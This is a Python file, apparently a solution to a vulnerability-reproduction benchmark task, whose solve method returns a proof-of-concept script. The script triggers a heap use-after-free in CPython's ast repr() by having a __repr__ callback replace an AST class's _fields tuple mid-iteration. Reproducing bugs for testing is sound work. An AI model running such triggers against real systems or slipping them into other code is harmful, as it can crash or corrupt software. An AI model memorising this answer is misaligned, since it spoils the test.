import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Heap Use-After-Free in the `ast` module's `repr()` implementation.
        It occurs when the `_fields` attribute of an AST class is modified (and freed) while 
        `AST_repr` is iterating over it. This happens if `AST_repr` borrows the reference 
        to `_fields` without incrementing the reference count.
        """
        poc = (
            b"import ast\n"
            b"import gc\n"
            b"\n"
            b"# Define a custom AST node\n"
            b"class VulnerableNode(ast.AST):\n"
            b"    # We define _fields dynamically as a tuple to avoid it being a compile-time constant.\n"
            b"    # This allows the tuple to be deallocated when we remove the reference from the class.\n"
            b"    _fields = tuple(['field_a', 'field_b'])\n"
            b"\n"
            b"class Exploit:\n"
            b"    def __repr__(self):\n"
            b"        # This method is called when AST_repr is formatting 'field_a'.\n"
            b"        # We replace VulnerableNode._fields with an empty tuple.\n"
            b"        # If the original tuple's refcount drops to zero and AST_repr is still iterating it\n"
            b"        # (via a borrowed pointer), a Use-After-Free occurs when it advances to 'field_b'.\n"
            b"        VulnerableNode._fields = ()\n"
            b"        # Force garbage collection to ensure the tuple is cleaned up immediately if needed\n"
            b"        gc.collect()\n"
            b"        return 'Exploit'\n"
            b"\n"
            b"def trigger():\n"
            b"    node = VulnerableNode()\n"
            b"    node.field_a = Exploit()\n"
            b"    node.field_b = 'This triggers the UAF access'\n"
            b"    \n"
            b"    try:\n"
            b"        # This call triggers the AST traversal\n"
            b"        repr(node)\n"
            b"    except Exception:\n"
            b"        # Catch exceptions to ensure the fixed version exits cleanly (exit code 0)\n"
            b"        pass\n"
            b"\n"
            b"if __name__ == '__main__':\n"
            b"    trigger()\n"
        )
        return poc